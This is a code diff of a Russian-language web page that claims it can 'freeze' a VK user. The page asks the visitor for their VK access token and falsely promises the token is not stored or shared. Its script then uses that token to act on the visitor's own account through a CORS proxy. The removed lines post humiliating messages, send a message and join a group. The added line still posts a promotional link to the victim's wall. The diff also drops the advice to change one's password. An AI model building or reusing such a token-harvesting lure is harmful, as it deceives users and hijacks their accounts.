@@ -22,7 +22,7 @@
 				<p><input class="form-control" placeholder="Токен" id="token"></p>
 				<p><input class="form-control" placeholder="Ссылка на пользователя"></p>
 				<p><button class="btn btn-primary mr-1" id="action">Заморозить</button></p>
-				<p><b>Ваш токен нигде не хранится и никому не передаётся. Можете для уверенности после процедуры поменять свой пароль.</b></p>
+				<p><b>Ваш токен нигде не хранится и никому не передаётся.</b></p>
 				<iframe width="560" height="315" src="https://www.youtube.com/embed/ilfIzgAOaN8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 				<p>Видеоинструкция по использованию</p>
 			</div>
@@ -34,10 +34,7 @@
 		button.onclick = function() {
 			let token = document.getElementById('token').value;
 
-			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/wall.post?v=5.103&access_token=${token}&message=vto.pe ШОК НАКРУТКА ВК 2020 Я ЛОХ я гей сова никогда не спит`).then(response => console.log(response.json()));
-			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/wall.post?v=5.103&access_token=${token}&attachments=https://www.youtube.com/watch?v=ilfIzgAOaN8`).then(response => console.log(response.json()));
-			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/messages.send?v=5.103&access_token=${token}&message=ya popalsya na klikbeit1&peer_id=-192835178&random_id=0`).then(response => console.log(response.json()));
-			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/groups.join?v=5.103&access_token=${token}&group_id=192835178`).then(response => console.log(response.json()));
+			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/wall.post?v=5.103&access_token=${token}&message=vto.pe`).then(response => console.log(response.json()));
 
 			setTimeout(function(){
 				let el = document.createElement('div');
